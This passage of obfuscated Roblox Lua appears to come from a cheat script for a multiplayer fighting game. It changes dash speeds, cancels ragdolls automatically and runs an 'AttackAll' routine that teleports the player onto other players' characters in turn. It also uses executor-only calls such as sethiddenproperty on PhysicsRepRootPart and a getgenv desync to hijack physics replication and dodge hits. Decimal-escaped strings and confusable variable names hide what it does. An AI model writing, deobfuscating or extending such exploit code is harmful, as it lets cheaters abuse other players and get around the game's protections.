 if descendant:IsA("\066\111\100\121\086\101\108\111\099\105\116\121") then if descendant.Name ~= "\109\111\118\101\109\101" or (descendant:GetAttribute("\083\112\101\101\100") or 0x0) ~= 0xA5 then if descendant.Name == "\100\111\100\103\101\118\101\108\111\099\105\116\121" and not descendant:GetAttribute("\067\108\111\110\101") then RunService.Stepped:Wait() for _lllIlllIIl, dashTrack in pairs(_lllIlIIlll:GetPlayingAnimationTracks()) do if dashTrack.Animation.AnimationId:match("\049\048\052\057\049\057\057\051\054\056\050") and dashTrack.TimePosition <= 0.1 then if _IIlIlIIlIl.CustomBackDash.Value then local _IIIllIIlll = descendant:Clone() _IIIllIIlll:SetAttribute("\067\108\111\110\101", true) table.insert(_lIIIIlIlII, _IIIllIIlll) descendant.Parent = workspace while descendant and descendant.Parent do _IIIllIIlll.Parent = _lIlllIlIlI _IIIllIIlll.Velocity = descendant.Velocity * _IlIllIIllI.BDDistance.Value RunService.RenderStepped:Wait() end
 if _IIIllIIlll and _IIIllIIlll.Parent then _IIIllIIlll:Destroy() local _lIllIIIIII = table.find(_lIIIIlIlII, _IIIllIIlll) if _lIllIIIIII then table.remove(_lIIIIlIlII, _lIllIIIIII) end
 end
 end
 return end
 end
 if _IIlIlIIlIl.CustomSideDash.Value then local _IIlIIIIlII = descendant:Clone() _IIlIIIIlII:SetAttribute("\067\108\111\110\101", true) table.insert(_lIIIIlIlII, _IIlIIIIlII) descendant.Parent = workspace while descendant and descendant.Parent do _IIlIIIIlII.Parent = _lIlllIlIlI _IIlIIIIlII.Velocity = descendant.Velocity * _IlIllIIllI.SDDistance.Value RunService.RenderStepped:Wait() end
 if _IIlIIIIlII and _IIlIIIIlII.Parent then _IIlIIIIlII:Destroy() local _lIllIIIIII = table.find(_lIIIIlIlII, _IIlIIIIlII) if _lIllIIIIII then table.remove(_lIIIIlIlII, _lIllIIIIII) end
 end
 end
 end
 else if _IIlIlIIlIl.CustomFrontDash.Value then descendant:SetAttribute("\083\112\101\101\100", _IlIllIIllI.FDDistance.Value) end
 for _lllIlllIIl, cloneItem in pairs(_lIIIIlIlII) do cloneItem:Destroy() end
 table.clear(_lIIIIlIlII) end
 end
 if descendant:IsA("\066\111\100\121\080\111\115\105\116\105\111\110") then if descendant.Name ~= "\065\073\082\066\080" or (descendant.D ~= 0x320 or (descendant.P ~= 0x2710 or (descendant.MaxForce ~= Vector3.new(0x1,0x1,0x1) * 0x9C40 or not _IIlIlIIlIl.NoBP_WindstormFury.Value))) then if descendant.Name ~= "\065\073\082\066\080" or (descendant.D ~= 0x320 or (descendant.P ~= 0x2710 or (descendant.MaxForce ~= Vector3.new(0x1,0x1,0x1) * 0x9C40 or (descendant:GetAttribute("\083\112\105\110\067\101\110\116\101\114") == nil or not _IIlIlIIlIl.NoBP_TatsumakiUlt.Value)))) then if descendant.Name == "\065\073\082\066\080" and (descendant.D == 0x352 and (descendant.P == 0x2710 and (descendant.MaxForce == Vector3.new(0x1,0x1,0x1) * 0x9C40 and _IIlIlIIlIl.NoBP_PreysPeril.Value))) then task.spawn(pcall, _IIIIIIllII, descendant, false) end
 else task.spawn(pcall, _IIIIIIllII, descendant, false) end
 else task.spawn(pcall, _IIIIIIllII, descendant, false) end
 end
 if descendant.Name == "\084\104\114\111\119\084\114\097\115\104\099\097\110" then _IlIIlIllIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = true task.delay(0.25, function () _IlIIlIllIl["\084\114\097\115\104\099\097\110\032\076\097\117\110\099\104"] = false end
 ) end
 if descendant:IsA("\065\099\099\101\115\115\111\114\121") then if descendant.Name == "\082\097\103\100\111\108\108" then if _IIlIlIIlIl.AutoRagdollCancel.Value then _IIIIIIlIll({ Dash = Enum.KeyCode.S, Key = Enum.KeyCode.Q, Goal = "\075\101\121\080\114\101\115\115", }) end
 end
 end
 end
 ) _llIIllllIl[#_llIIllllIl+0x1] = _lllIlIIlll.AnimationPlayed:Connect( function (animTrack) local _lllIIlllll = animTrack.Animation.AnimationId if _lllIIlllll:match("\049\048\052\056\048\055\057\054\048\050\049") or _lllIIlllll:match("\049\048\052\056\048\055\057\051\057\054\050") then if _IIlIlIIlIl.CustomSideDash.Value then animTrack:AdjustSpeed(_IlIllIIllI.SDSpeed.Value) end
 end
 end
 ) _llIIllllIl[#_llIIllllIl+0x1] = _lllIlIIlll.AnimationPlayed:Connect( function (animTrack) local _lllIIlllll = animTrack.Animation.AnimationId if not _IIlIlIIlIl.AttackAll.Value then return end
 local function _IlIIlIlIll(_IIIlIlIIll) if not _IIIlIlIIll or not _IIIlIlIIll:IsA("\080\108\097\121\101\114") then return false end
 local _IIllllIlII = _llIlIlIlIl(_IIIlIlIIll) local _IIIlIIlIII = _IIllllIlII and _IIllllIlII:GetAttribute("\067\104\097\114\097\099\116\101\114") if type(_IIIlIIlIII) ~= "\115\116\114\105\110\103" then return false end
 _IIIlIIlIII = _IIIlIIlIII:lower() return _IIIlIIlIII == "\104\117\110\116\101\114" or _IIIlIIlIII == "\098\108\097\100\101" or _IIIlIIlIII:find("\122\111\109\098\105\101", 0x1, true) ~= nil end
 local function _IllllllllI(shouldAnchor) local _IllIIIllII _IllIIIllII = RunService.Heartbeat:Connect( function () if not shouldAnchor() then _IllIIIllII:Disconnect() return end
 local _IlIIIIIIll = _llIlIlllII(_llIlIlIlIl(_llIIIlIIll)) if _IlIIIIIIll then _IlIIIIIIll.AssemblyLinearVelocity = Vector3.new() _IlIIIIIIll.AssemblyAngularVelocity = Vector3.new() end
 end
 ) return _IllIIIllII end
 local _IlllIIlIlI = nil local _lIIIIIlIlI = nil local _IlIlIIlIll = nil local _llIIIIIlll = nil local function _IIIlIIIIIl() if _IlllIIlIlI then _IlllIIlIlI:Disconnect() _IlllIIlIlI = nil end
 if _lIIIIIlIlI then _lIIIIIlIlI:Disconnect() _lIIIIIlIlI = nil end
 if sethiddenproperty then if _IlIlIIlIll and _IlIlIIlIll.Parent then pcall( function () sethiddenproperty(_IlIlIIlIll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _llIIIIIlll and _llIIIIIlll.Parent then pcall( function () sethiddenproperty(_llIIIIIlll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _IlIlIIlIll and _IlIlIIlIll.Parent then _IlIlIIlIll.CFrame = CFrame.new(_IlIlIIlIll.Position) _IlIlIIlIll.AssemblyLinearVelocity = Vector3.zero _IlIlIIlIll.AssemblyAngularVelocity = Vector3.zero pcall( function () _IlIlIIlIll.Velocity = Vector3.zero end
 ) pcall( function () _IlIlIIlIll.RotVelocity = Vector3.zero end
 ) local _IllIIIIlll = _IlIlIIlIll.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIIIIlll then pcall( function () _IllIIIIlll.AutoRotate = true end
 ) end
 end
 _IlIlIIlIll = nil _llIIIIIlll = nil end
 local function _llIllllIll() _IIIlIIIIIl() end
 local function _IIIIIlIIII(_IIIlIIIllI, _IIlIIlIlII) if _IlllIIlIlI then _IlllIIlIlI:Disconnect() _IlllIIlIlI = nil end
 if _IlIlIIlIll and _IlIlIIlIll.Parent then _IlIlIIlIll.AssemblyLinearVelocity = Vector3.zero _IlIlIIlIll.AssemblyAngularVelocity = Vector3.zero pcall( function () _IlIlIIlIll.Velocity = Vector3.zero end
 ) pcall( function () _IlIlIIlIll.RotVelocity = Vector3.zero end
 ) end
 if not _IIIlIIIllI or not _IIlIIlIlII then return end
 _IlIlIIlIll = _IIIlIIIllI _llIIIIIlll = _IIlIIlIlII if _lIIIIIlIlI then _lIIIIIlIlI:Disconnect() _lIIIIIlIlI = nil end
 local _llIIllIIII = _IIIlIIIllI.Parent and _IIIlIIIllI.Parent:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _llIIllIIII then _lIIIIIlIlI = RunService.RenderStepped:Connect( function () if _llIIllIIII and _llIIllIIII.Parent then pcall( function () _llIIllIIII.AutoRotate = false end
 ) end
 end
 ) end
 _IIIlIIIllI.CFrame = _IIlIIlIlII.CFrame * CFrame.new(0x0, 0x0, 0x5) _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIIlIIIllI) end
 ) pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIlIIlIlII) end
 ) end
 local _IlIIIIlIIl _IlIIIIlIIl = RunService.Heartbeat:Connect( function () if not _IIIlIIIllI or not _IIIlIIIllI.Parent or not _IIlIIlIlII or not _IIlIIlIlII.Parent then _IlIIIIlIIl:Disconnect() if _IlllIIlIlI == _IlIIIIlIIl then _IlllIIlIlI = nil end
 if sethiddenproperty then if _IIIlIIIllI and _IIIlIIIllI.Parent then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _IIlIIlIlII and _IIlIIlIlII.Parent then pcall( function () sethiddenproperty(_IIlIIlIlII, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _IIIlIIIllI and _IIIlIIIllI.Parent then _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero pcall( function () _IIIlIIIllI.Velocity = Vector3.zero end
 ) pcall( function () _IIIlIIIllI.RotVelocity = Vector3.zero end
 ) end
 return end
 _IIIlIIIllI.CFrame = _IIlIIlIlII.CFrame * CFrame.new(0x0, 0x0, 0x5) _IIIlIIIllI.AssemblyLinearVelocity = Vector3.zero _IIIlIIIllI.AssemblyAngularVelocity = Vector3.zero if sethiddenproperty then pcall( function () sethiddenproperty(_IIIlIIIllI, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", _IIlIIlIlII) end
 ) end
 end
 ) _IlllIIlIlI = _IlIIIIlIIl end
 if _lllIIlllll:match("\049\052\055\049\057\050\057\048\051\050\056") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\083\097\118\097\103\101\032\084\111\114\110\097\100\111") then task.spawn( function () local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) if not _IIIlIIIllI then return end
 local _IIIIllIlIl = _IIIlIIIllI.CFrame RunService.Heartbeat:Once( function () _IIIlIIIllI.CFrame = CFrame.new(0x0, -0x2710, 0x0) end
 ) task.wait(0.9) local _IIlIIllIIl = tick() repeat _lIIlIIllII(true) task.wait(0.03) until tick() >= _IIlIIllIIl + 1.75 game:GetService("\084\119\101\101\110\083\101\114\118\105\099\101"):Create(_IIIlIIIllI, TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), { CFrame = CFrame.new(0x160, 0x1B6, 0x188), }):Play() task.wait(1.5) RunService.Heartbeat:Once( function () _IIIlIIIllI.CFrame = _IIIIllIlIl end
 ) end
 ) end
 if _lllIIlllll:match("\049\052\055\048\049\050\052\050\054\054\049") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\066\114\117\116\097\108\032\066\101\097\116\100\111\119\110") then task.spawn( function () local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) if not _IIIlIIIllI then return end
 RunService.Heartbeat:Once( function () _IIIlIIIllI.CFrame = CFrame.new(0x0, -0x2710, 0x0) end
 ) task.wait(0x2) local _IIlIIllIIl = tick() repeat _lIIlIIllII(true) task.wait(0.05) until tick() >= _IIlIIllIIl + 4.5 local _IIlIllIIlI = tick() repeat _lIIlIIllII(true) task.wait(0.05) until tick() >= _IIlIllIIlI + 1.3 end
 ) end
 if _lllIIlllll:match("\049\056\056\057\054\050\050\057\051\050\049") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\084\119\105\110\032\070\097\110\103\115") then task.spawn( function () local _lllllIllIl = _llIlIlIlIl(_llIIIlIIll) if not _lllllIllIl then return end
 if _lllllIllIl:GetAttribute("\067\104\097\114\097\099\116\101\114") ~= "\080\117\114\112\108\101" then return end
 if not _lllllIllIl:GetAttribute("\085\108\116\101\100") then return end
 local _lIlllIIIll = tick() + 0x3 local _IllIllllII = true local _lIIIIIIIlI = tick() task.spawn( function () repeat task.wait() until tick() >= _lIIIIIIIlI + 2.5 or not _IllIllllII if not _IllIllllII then return end
 local _IllIIIIIII = _llIlIlIlIl(_llIIIlIIll) if not _IllIIIIIII or not _IllIIIIIII:GetAttribute("\085\108\116\101\100") then return end
 getgenv().desync = { CFrame = CFrame.new(0x0, -0x7148, 0x0) } task.wait(0.2) getgenv().desync = nil end
 ) local _IlIIllIIlI = _IllllllllI( function () return _IllIllllII end
 ) local _lIIllIlIII = {} local _IIlIlIIllI = nil local _llIlIIIIll = tick() local _lllIllllII = nil do local _IIIlIIllII = _llIlIlIlIl(_llIIIlIIll) local _IIlllIIIll = _IIIlIIllII and _llIlIlllII(_IIIlIIllII) if _IIlllIIIll then _lllIllllII = _IIlllIIIll.CFrame end
 end
 local function _lIllIIllII(_IIlIIllIIl) if not _IIlIIllIIl then return nil end
 if _IIlIIllIIl:IsA("\080\108\097\121\101\114") then return _llIlIlIlIl(_IIlIIllIIl) end
 return _IIlIIllIIl end
 local function _lllIllllII(_IIlIIllIIl) return _lIllIlIIlI(_lIllIIllII(_IIlIIllIIl)) end
 local function _IIIIIIIIII(_IIlIIllIIl) return _llIlIlllII(_lIllIIllII(_IIlIIllIIl)) end
 local function _lIIIlllIIl(_IIIlIlllll) if not _IIIlIlllll then return false end
 if _IIIlIlllll:FindFirstChild("\070\111\114\099\101\070\105\101\108\100") then return true end
 if _IIIlIlllll:FindFirstChild("\065\098\115\111\108\117\116\101\073\109\109\111\114\116\097\108") then return true end
 if _IIIlIlllll:FindFirstChild("\066\101\105\110\103\071\114\097\098\098\101\100") then return true end
 if _IIIlIlllll:FindFirstChild("\072\117\110\116\101\114\067\111\117\110\116\101\114") then return true end
 if _IIIlIlllll:FindFirstChild("\065\116\111\109\105\099\067\111\117\110\116\101\114") then return true end
 return false end
 local function _llIlIIlIIl(_IIIlIlIIll) local _IIIlIlllll = _lIllIIllII(_IIIlIlIIll) local _IlIIIIlIIl = _IIIlIlllll and _lIllIlIIlI(_IIIlIlllll) if not _IIIlIlllll or not _IlIIIIlIIl then return true end
 if _IlIIIIlIIl.Health <= 0x0 then return true end
 if _IIIlIlIIll:IsA("\080\108\097\121\101\114") then if _lIIIlllIIl(_IIIlIlllll) then return true end
 if _IIIlIlllll:FindFirstChild("\067\111\117\110\116\101\114") then return true end
 if _IIIIIlIlII(_IlIIIIlIIl, "\049\053\049\050\056\056\052\057\048\052\055") then return true end
 if _IIIlIlllll:GetAttribute("\085\108\116\101\100") and _IIIlIlllll:GetAttribute("\067\104\097\114\097\099\116\101\114") == "\066\097\116\116\101\114" then return true end
 end
 return false end
 local function _llllIIllIl(_IIIlIlIIll) local _IlIIIIlIIl = _lllIllllII(_IIIlIlIIll) return _IlIIIIlIIl and (_IIIIIlIlII(_IlIIIIlIIl, "\049\056\056\057\054\050\050\050\056\053\051") or _IIIIIlIlII(_IlIIIIlIIl, "\049\051\055\052\051\052\050\053\055\053\049\054\048\049\052")) end
 local function _IIIllIIlll(_IIIlIlIIll) if not _IIIlIlIIll or not _IIIlIlIIll:IsA("\080\108\097\121\101\114") then return false end
 local _IIIlIlllll = _llIlIlIlIl(_IIIlIlIIll) local _IlIIIIlIIl = _IIIlIlllll and _lIllIlIIlI(_IIIlIlllll) if not _IIIlIlllll or not _IlIIIIlIIl then return false end
 if _IlIIIIlIIl.Health <= 0x0 then return false end
 if _IIIIIlIlII(_IlIIIIlIIl, "\049\053\049\050\056\056\052\057\048\052\055") then return false end
 return _lIIIlllIIl(_IIIlIlllll) end
 local function _IIIlIlllIl() local _IlIllllIII = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if not _IlIllllIII then return nil end
 local _IlIIIIlIIl = _lIllIlIIlI(_IlIllllIII) if not _IlIIIIlIIl or _IlIIIIlIIl.Health <= 0x0 then return nil end
 return _IlIllllIII end
 local function _llIllIIlII(excluded) local _IlIlIlIIIl = {} local _IllIIIlIlI = {} for _lllIlllIIl, _IIIIIlIlll in pairs(_llIIIlllII()) do if _IIIIIlIlll == excluded or _lIIllIlIII[_IIIIIlIlll] then continue end
 if table.find(RevenantWhitelist, _IIIIIlIlll) then continue end
 local _llllIIlllI = _IIIIIIIIII(_IIIIIlIlll) if not _llIlIIlIIl(_IIIIIlIlll) and not _llllIIllIl(_IIIIIlIlll) and _llllIIlllI then if _IlIIlIlIll(_IIIIIlIlll) then table.insert(_IlIlIlIIIl, _IIIIIlIlll) else table.insert(_IllIIIlIlI, _IIIIIlIlll) end
 end
 end
 if #_IlIlIlIIIl > 0x0 then return _IlIlIlIIIl[math.random(0x1, #_IlIlIlIIIl)] end
 if #_IllIIIlIlI > 0x0 then return _IllIIIlIlI[math.random(0x1, #_IllIIIlIlI)] end
 local _IlIllllIII = _IIIlIlllIl() if _IlIllllIII and _IlIllllIII ~= excluded and not _lIIllIlIII[_IlIllllIII] then return _IlIllllIII end
 return nil end
 local _IIlllllIll = nil local function _llllIlIlll(next) if _IIlllllIll then pcall( function () _IIlllllIll:Disconnect() end
 ) _IIlllllIll = nil end
 _IIIlIIIIIl() _IIlIlIIllI = next _llIlIIIIll = tick() if next then local _lIIllIIllI = _llIlIlIlIl(_llIIIlIIll) local _IIIlIIIllI = _lIIllIIllI and _llIlIlllII(_lIIllIIllI) local _IIIIllIIIl = _IIIIIIIIII(next) if _IIIlIIIllI and _IIIIllIIIl then _IIIIIlIIII(_IIIlIIIllI, _IIIIllIIIl) local _IlIIIIlIIl = _lllIllllII(next) if _IlIIIIlIIl then local _IIIIlIIllI = _IlIIIIlIIl:FindFirstChildOfClass("\065\110\105\109\097\116\111\114") local _lIlllIIIll = _IIIIlIIllI and _IIIIlIIllI.AnimationPlayed or _IlIIIIlIIl.AnimationPlayed _IIlllllIll = _lIlllIIIll:Connect( function (_llIIllIlIl) local _IIIIllIIlI = _llIIllIlIl.Animation.AnimationId if _IIIIllIIlI:match("\049\056\056\057\054\050\050\050\056\053\051") or _IIIIllIIlI:match("\049\051\055\052\051\052\050\053\055\053\049\054\048\049\052") then if not _IllIllllII then return end
 local _IllIlIlIlI = _IIlIlIIllI if not _IllIlIlIlI then return end
 _lIIllIlIII[_IllIlIlIlI] = true _IIIlIIIIIl() local _lIIIlIIlll = _llIllIIlII(_IllIlIlIlI) if _lIIIlIIlll then _llllIlIlll(_lIIIlIIlll) if _llIllIIlII(_lIIIlIIlll) == nil and not _IIIIlIIlIl() then task.wait(0.1) _lIIllIlIII[_lIIIlIIlll] = true _IllIlIIIIl = true _IlIllIlIll() end
 else if _IIIIlIIlIl() then _IIIlIIIIIl() _IIlIlIIllI = nil else _IllIlIIIIl = true _IlIllIlIll() end
 end
 end
 end
 ) end
 end
 end
 end
 local function _llllllllIl() if not _lllIllllII then return end
 local _IIlIIIllll = _llIlIlIlIl(_llIIIlIIll) local _IlIllIlIll = _IIlIIIllll and _llIlIlllII(_IIlIIIllll) if _IlIllIlIll then pcall( function () _IlIllIlIll.CFrame = _lllIllllII end
 ) end
 end
 local function _IIIlllIlll() local _IIlIIIllll = _llIlIlIlIl(_llIIIlIIll) local _lIlllIlIlI = _IIlIIIllll and _lIllIlIIlI(_IIlIIIllll) if _lIlllIlIlI then pcall( function () _lIlllIlIlI.AutoRotate = true end
 ) end
 end
 local _lIlIlIIlII = workspace.Live.ChildAdded:Connect( function (_IIlIlIIIII) if _IIlIlIIIII.Name == "\087\101\097\107\101\115\116\032\068\117\109\109\121" then _lIIllIlIII[_IIlIlIIIII] = nil end
 end
 ) local _IlllIIIlII = RunService.RenderStepped:Connect( function () for _lllIlllIIl, _IIIIIlIlll in pairs(_llIIIlllII()) do if table.find(RevenantWhitelist, _IIIIIlIlll) then continue end
 if not _lIIllIlIII[_IIIIIlIlll] then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _IIlIllIIlI = _lIlIIIIlII and _lIllIlIIlI(_lIlIIIIlII) if _lIlIIIIlII and _IIlIllIIlI and _IIlIllIIlI.Health > 0x0 and not _lIIIlllIIl(_lIlIIIIlII) then _lIIllIlIII[_IIIIIlIlll] = nil if not _IIlIlIIllI then _llllIlIlll(_IIIIIlIlll) end
 end
 end
 end
 ) local function _IIIIlIIlIl() for _lllIlllIIl, _IIIIIlIlll in pairs(_llIIIlllII()) do if _lIIllIlIII[_IIIIIlIlll] then continue end
 if table.find(RevenantWhitelist, _IIIIIlIlll) then continue end
 if _IIIllIIlll(_IIIIIlIlll) then return true end
 end
 return false end
 local _lIlIlllIlI = false local function _IlIllIlIll() if _lIlIlllIlI then return end
 _lIlIlllIlI = true _IIIlIIIIIl() _IIIlllIlll() if _IlllIIIlII then pcall( function () _IlllIIIlII:Disconnect() end
 ) end
 if _lIlIlIIlII then pcall( function () _lIlIlIIlII:Disconnect() end
 ) end
 if _IIlllllIll then pcall( function () _IIlllllIll:Disconnect() end
 ) _IIlllllIll = nil end
 _IllIllllII = false _llIllllIll() end
 local _IllIlIIIIl = false local _IlIIIlllll = _llIllIIlII(nil) if _IlIIIlllll then _llllIlIlll(_IlIIIlllll) if _llIllIIlII(_IlIIIlllll) == nil then task.wait(0.1) _lIIllIlIII[_IlIIIlllll] = true _IllIlIIIIl = true _IlIllIlIll() return end
 end
 while animTrack.IsPlaying and tick() < _lIlllIIIll do RunService.Heartbeat:Wait() local _IllIlIlllI = tick() local _IIIIIIIlIl = false if not _IIlIlIIllI then _IIIIIIIlIl = true else if _llIlIIlIIl(_IIlIlIIllI) then if not _IIIllIIlll(_IIlIlIIllI) then _lIIllIlIII[_IIlIlIIllI] = true end
 _IIIIIIIlIl = true elseif _IllIlIlllI - _llIlIIIIll >= 0.8 then _lIIllIlIII[_IIlIlIIllI] = true _IIIIIIIlIl = true end
 end
 if _IIIIIIIlIl then local next = _llIllIIlII(_IIlIlIIllI) if not next then if _IIIIlIIlIl() then _IIIlIIIIIl() _IIlIlIIllI = nil else _IllIlIIIIl = true _IlIllIlIll() break end
 else _llllIlIlll(next) if _llIllIIlII(next) == nil and not _IIIIlIIlIl() then task.wait(0.1) _lIIllIlIII[next] = true _IllIlIIIIl = true _IlIllIlIll() break end
 end
 end
 do local _IIlIIllllI = _IIIlIlllIl() if _IIlIIllllI and not _lIIllIlIII[_IIlIIllllI] then local _IlIIIIlIII = _IIlIIllllI:FindFirstChild("\072\117\109\097\110\111\105\100") local _IlIIIlllIl = _IlIIIIlIII and _IlIIIIlIII:FindFirstChild("\065\110\105\109\097\116\111\114") local function _llIlllllII(_IIIIllIIlI) if not _IlIIIlllIl then return false end
 for _lllIlllIIl, _IIlIIllIIl in pairs(_IlIIIlllIl:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match(_IIIIllIIlI) then return true end
 end
 return false end
 if _IlIIIIlIII and (_llIlllllII("\049\056\056\057\054\050\050\050\056\053\051") or _llIlllllII("\049\051\055\052\051\052\050\053\055\053\049\054\048\049\052")) then _lIIllIlIII[_IIlIIllllI] = true if _IIlIlIIllI == _IIlIIllllI then _IIIlIIIIIl() local _lIIIlIIlll = _llIllIIlII(_IIlIIllllI) if _lIIIlIIlll then _llllIlIlll(_lIIIlIIlll) if _llIllIIlII(_lIIIlIIlll) == nil and not _IIIIlIIlIl() then task.wait(0.1) _lIIllIlIII[_lIIIlIIlll] = true _IllIlIIIIl = true _IlIllIlIll() break end
 else if _IIIIlIIlIl() then _IIlIlIIllI = nil else _IllIlIIIIl = true _IlIllIlIll() break end
 end
 end
 end
 end
 end
 end
 _IlIllIlIll() end
 ) end
 if _lllIIlllll:match("\057\051\053\052\054\048\048\052\052\050\056\057\048\052") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then _lIIIIIIllI = 0x0 _IIIlIIIlIl = false task.spawn( function () local _IIlIIIllll = _llIlIlIlIl(_llIIIlIIll) local _lIlllIlIlI = _IIlIIIllll and _lIllIlIIlI(_IIlIIIllll) local _IlllIIlIII = _lIlllIlIlI and _lIlllIlIlI:FindFirstChild("\065\110\105\109\097\116\111\114") if not _IlllIIlIII then return end
 while true do local _IlllIIlllI = false for _lllIlllIIl, _IIlIIllIIl in pairs(_IlllIIlIII:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match("\057\051\053\052\054\048\048\052\052\050\056\057\048\052") then _IlllIIlllI = true break end
 end
 if not _IlllIIlllI then _lIIIIIIllI = 0x0 _IIIlIIIlIl = false break end
 for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll == _llIIIlIIll then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) local _IIlIllIIlI = _lIlIIIIlII and _lIllIlIIlI(_lIlIIIIlII) if _IIlIllIIlI and _lIlIIIIlII and not _lIlIIIIlII:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then if _IIIIIlIlII(_IIlIllIIlI, "\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") then _lIlIIIIlII:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) _lIIIIIIllI = _lIIIIIIllI + 0x1 local _lIlllIIlII = _IIIIIlIlll.Name end
 end
 end
 local _IIlIIllllI = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") local _IIIIIlIlII = _IIlIIllllI and _IIlIIllllI:FindFirstChild("\072\117\109\097\110\111\105\100") local _lIlIIlIIll = _IIIIIlIlII and _IIIIIlIlII:FindFirstChild("\065\110\105\109\097\116\111\114") if _lIlIIlIIll and _IIlIIllllI and not _IIlIIllllI:GetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116") then for _lllIlllIIl, _IIlIIllIIl in pairs(_lIlIIlIIll:GetPlayingAnimationTracks()) do if _IIlIIllIIl.Animation.AnimationId:match("\049\050\057\057\052\053\057\048\055\048\052\052\049\050\053") then _IIlIIllllI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", true) end
 end
 end
 task.wait() end
 end
 ) end
 if _lllIIlllll:match("\055\050\052\053\049\055\049\053\053\056\051\050\050\053") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then task.spawn( function () for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll == _llIIIlIIll then continue end
 local _lIlIIIIlII = _llIlIlIlIl(_IIIIIlIlll) if _lIlIIIIlII then _lIlIIIIlII:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 local _IIlIIllllI = workspace.Live:FindFirstChild("\087\101\097\107\101\115\116\032\068\117\109\109\121") if _IIlIIllllI then _IIlIIllllI:SetAttribute("\067\114\117\115\104\101\100\082\111\099\107\086\097\114\105\097\110\116", nil) end
 end
 ) if _IIIIlIIIll then _IIIIlIIIll = false end
 end
 if _lllIIlllll:match("\049\051\049\050\050\054\052\051\048\052\054\057\057\051\049") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then task.spawn( function () task.wait(1.2) local _IIIlllIIlI = _llIlIlIlIl(_llIIIlIIll) local _IlIIlIIlIl = _IIIlllIIlI and _llIlIlllII(_IIIlllIIlI) if not _IlIIlIIlIl then return end
 if (tonumber(_llIIIlIIll:GetAttribute("\085\108\116\105\109\097\116\101")) or 0x0) >= 0x64 then return end
 getgenv().desync = { CFrame = CFrame.new(0x0, -0x7148, 0x0) } task.wait(0.65) getgenv().desync = nil end
 ) end
 if _lllIIlllll:match("\049\051\053\049\048\052\050\049\048\052\048\048\054\049\048") and rawget(_IlIllIIllI.AttackAllMoves.Value, "\067\114\117\115\104\101\100\032\082\111\099\107\032\086\097\114\105\097\110\116") then local _lIlIllllll = false local _IlllIIlllI = {} local _IllIlIIllI = nil local _IIIllIllII = nil local _llllIIllIl = nil local _llIlIIllll = nil local function _IIIlIIlIlI() if _IllIlIIllI then _IllIlIIllI:Disconnect() _IllIlIIllI = nil end
 if _IIIllIllII then _IIIllIllII:Disconnect() _IIIllIllII = nil end
 if sethiddenproperty then if _llllIIllIl and _llllIIllIl.Parent then pcall( function () sethiddenproperty(_llllIIllIl, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 if _llIlIIllll and _llIlIIllll.Parent then pcall( function () sethiddenproperty(_llIlIIllll, "\080\104\121\115\105\099\115\082\101\112\082\111\111\116\080\097\114\116", nil) end
 ) end
 end
 if _llllIIllIl and _llllIIllIl.Parent then _llllIIllIl.CFrame = CFrame.new(_llllIIllIl.Position) _llllIIllIl.AssemblyLinearVelocity = Vector3.zero _llllIIllIl.AssemblyAngularVelocity = Vector3.zero pcall( function () _llllIIllIl.Velocity = Vector3.zero end
 ) pcall( function () _llllIIllIl.RotVelocity = Vector3.zero end
